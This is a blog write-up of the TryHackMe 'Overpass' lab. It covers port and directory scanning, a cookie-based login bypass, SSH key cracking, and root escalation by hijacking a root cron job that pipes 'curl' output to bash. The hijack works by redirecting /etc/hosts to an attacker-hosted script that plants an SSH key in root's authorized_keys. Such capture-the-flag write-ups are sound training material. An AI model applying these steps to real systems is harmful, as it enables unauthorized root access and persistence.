---
layout: blog.html
title: "TryHackMe - Overpass Writeup"
date: 2021-08-16
thumbnail: "https://jacen-safe.s3.us-west-004.backblazeb2.com/lL4gVwyKT71X.png"
---

By now, everyone has done a writeup of the [Overpass](https://tryhackme.com/room/overpass) room on TryHackMe, but I've decided I want to try my hand at it anyway. Hopefully someone will find it helpful.
<!-- more -->

## Nmap Enumeration
The first step in any pentest situation is enumeration. It's important to get as much information about the machine and its users as possible. To start off, we'll use Nmap to perform a port scan and see what services are active and listening on the box. Nmap is a versatile tool, and many people have their own preferred methods to balance speed and accuracy, but here are the options I'll use.

- `-sC`: Run default scripts. Nmap can do additional enumeration beyond just checking for open ports, and this option will run some quick and useful extra scans to give us even more information about what we're working with.
- `-sV`: Run version detection. Knowing what specific version of a service is in use can help with finding potential vulnerabilities, or ruling them out.
- `-v`: Be verbose. This outputs extra information to the console as the scan runs, the most useful of which are status updates and showing open ports as it finds them.
- `-oN`: Output to a file in the Nmap format. Having a file to refer back to instead of having to scroll through console output is very useful. Nmap can save to a variety of file formats, and you may have reasons to use them, but for me just the normal plain-text format is enough.
- `-p`: Scan specific ports. `-p<n>` will scan a specific port, and `-p-` scans every port from 1 to 65,535. While doing a full port scan is good, it can take a while, so it's good to let that one run while you're doing other tasks.

We'll run two Nmap scans. The first one will scan the top 1000 ports that are listening to give us a strong starting point, and the second scan will run in the background and check every possible port. Since this second scan will take longer, we can let it run in the background while we work on other things.

```bash
nmap -sC -sV -v -oN nmap-initial.nmap 10.10.223.56
nmap -p- -v -oN nmap-allports.nmap 10.10.223.56
```

The initial scan of the top 1000 ports on the box, finds two open ports: SSH on port 22, and HTTP on port 80. Web servers can get us a lot of interesting information about the box and its users, so that's where we'll enumerate next.

## Web Server Enumeration
The site seems to be a very simple HTML site with few pages. Sometimes sensitive or otherwise useful information can be hidden in a web page, so we'll look through all of the pages.

If we look at the source code for the home page, we find a potentially interesting comment hidden in it.

```html
            <p>Overpass allows you to securely store different
                passwords for every service, protected using military grade
                <!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
                cryptography to keep you safe.
            </p>
```

The about page doesn't have any hidden secrets, but they can be a potential source of usernames, so it's something to keep in mind.

The downloads page gives us various executables for the Overpass program, as well as the program's source code and a build script. We'll grab those last two in case they come in handy later.

There's not a whole lot that is immediately useful here, so we'll start a directory brute-force using Gobuster to look for any hidden pages. There aren't as many possible customizations as there are for Nmap, but there are still options you'll want to keep in mind with Gobuster.

- `dir`: Run Gobuster in directory brute-force mode. There are other options such as subdomain mode that are useful in other situations.
- `-u`: The URL to start from. Gobuster by default will only go one level deep, although there are options to increase that.
- `-w`: The wordlist to use. Gobuster needs a list of potential directory names to test in order to work. I use Kali Linux, which comes with Seclists, a popular collection of wordlists, which includes the `raft-small-words` wordlist. The main advantage of this wordlist is the inclusion of names such as `.git` which are useful in various situations.
- `-o`: Output to a file. Once again, having your output saved to a file that you can refer back to is vary useful.
- `-x`: Search for file extensions. Some good file extensions to check for are `.txt` and `.log` which can have some useful information in them. Occasionally, you might run into a `.zip` file with sensitive data too. If you happen to know that the site is powered by a specific markdown/programming language (HTML, PHP, ASP, etc.) it's good to search for file ending in the relevant file extension. Specifying file extensions does increase the length of your scan, however.

```bash
gobuster dir -u http://10.10.223.56 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.log
```

Gobuster finds a potentially interesting `/admin` page, but it appears to be password protected. If we want to see what's on the other side, we'll have to either find a way around that or find the admin credentials.

## Login Bypass
There are three JavaScript scripts powering the admin login page: `main.js`, `login.js`, and `cookie.js`. `main.js` contains a single `console.log` and is worthless to us, and `cookie.js` seems to just be some kind of [third-party framework](https://github.com/js-cookie/js-cookie), but `login.js` appears to be custom and could be useful to look through.

Looking through `login.js`, it seems to only check if the login response is "Incorrect Credentials" and will simply pass any other input as a cookie. We don't know if there's another utility script somewhere that actually checks the contents of the cookie, but we can try setting the cookie to an arbitrary value to see if the site lets us in. We could use a cookie editor for this or just use the existing scripts to add our cookie for us.

```js
Cookies.set("SessionToken","anything")
```

We successfully bypass the login form and are greeted with someone's RSA private key, as well as another potential username, `james`. The key is encrypted, so we can't just check it against the SSH server. There is a note on the admin page telling James to crack the key if he forgets the password, though, so presumably it isn't a particularly strong one. We'll use SSH2John and John the Ripper to try and crack the password on the key.

```bash
/usr/share/john/ssh2john.py james-key > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Now that we have the password, we can try to SSH into the box. Remember to set the permissions correctly on the key or the SSH client won't let you connect with it.

```bash
chmod 600 james-key
ssh -i james-key 10.10.223.56
```

We successfully land as `james`. He has the user flag, so we can grab and submit that.

## Privilege Escalation
Now that we have user-level access to the box, it's time to go back to enumeration and find out as much as we can about the box and the users on it. There are automated enumeration scripts like [LinPEAS](https://github.com/carlospolop/PEASS-ng) to handle some of that for us, but there is some manual enumeration you can do quickly, and even some enumeration that these scripts can't handle.

First we'll see what files are in James' home directory. One thing that should catch our eye is the `todo.txt`. If we read this file, we learn a few potentially interesting facts:

1. Overpass' encryption might not be difficult to crack (although we would already know that if we read through the source of the home page and of Overpass)
2. James probably has his password stored in Overpass
3. There is some kind of automated build system for Overpass

James also has a file in his home directory named `.overpass`. If we looked at the Overpass source code, we'd be aware that this is the file that stores all saved passwords securely in ROT47. We can use [CyberChef](https://gchq.github.io/CyberChef/) to convert the ROT47 into a password list.

This turns out to be James' login password on the box, enabling us to do some basic enumeration on his account using. The command `sudo -l` will show us what commands the current user is able to run using sudo. Unfortunately, he does not have any sudo rights, meaning we won't be getting an easy win that way.

Since we've taken care of a lot of the easy enumeration, we'll switch over to using LinPEAS to do an automated enumeration of the box. LinPEAS will check a lot of common privilege escalation vectors and flag any especially interesting ones for us to take a closer look at. While it shouldn't completely replace your manual enumeration, it significantly enhances and speeds up the enumeration process.

LinPEAS finds and flags a cron job for the build script that runs as root.

```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

The easiest way to exploit this cron job is to redirect the `overpass.thm` hostname to point to ourselves and host a malicious script. This can be done by editing the machine's `/etc/hosts` file, which lets you override DNS settings and manually map hostnames to IP addresses. Normally that would require root privileges, but on this machine the hosts file is world writeable, meaning we can edit it as the `james` user.

Now we have to decide how we want to escalate. A reverse shell would be quick and easy, but also a bit clunky, even after we stabilize it. Another easy and fun way would be flipping the setuid bit on bash, letting us run it as root. However, the method we'll use is adding an SSH key to root's authorized keys. SSH is a bit more friendly than even the setuid bash would be, and gives us access to features like transferring files and port forwarding.

```bash
mkdir /root/.ssh
echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpxmDeGMCh5ZbeRsshkrHFMUv/IBrOrGzm1YsZs57jg/wYyfYcJUZpp095JTus2fOMKv4nljB4k55A2LWJdzmPQlXMLDIyBd0n4eRZoz0pqRhJ7ZAjzCuFgNPaTssDLfE5U9rY8U3jmLmJM2WXbb5RnM3qOaIB1aIL/FQWWfRskgCrPeRC9EPXcRDC7hJN+BSj2hzXE6zjfJUhrOzM29Zydt0frNm7JmxqRdYAv9nRw2B9NuO0yDR+YFBTBa50H0uWgJh30KRGN9vFPzVQyhiAQHgU3lAWma/FWJCRbddOaKtOerTrz4ek0MhhyFzENV+VYKgh+cKZpcJX5j/8stjeXGHbAA2ZWnJ9oVS+Rb8COJR2c+KO/jyMBOUq9yrHO9bWS0oXu31xe2/5piUYRG7m/iV0GrjbHcmUj5sMdiSVSTDVcR/dkwx2AQ20Gu9eRhhhR8oT5kG0kfROqx5aEnZlTnngsYjQc4vp2L1DBSPIzgkP4HwQmvXhFvlax8zLApk= > /root/.ssh/authorized_keys
touch /dev/shm/created
```

This script first ensures that the .ssh directory exists, then adds our RSA public key as an authorized user on the machine. Finally, so we can confirm that the script really did run, it creates a file in `/dev/shm`.

With the hosts file modified and the script hosted on a local web server, all we have to do is wait. Once we see the `created` file is created, we know our script has run and we can SSH in as root. Now we just grab the root flag and we've completed the box.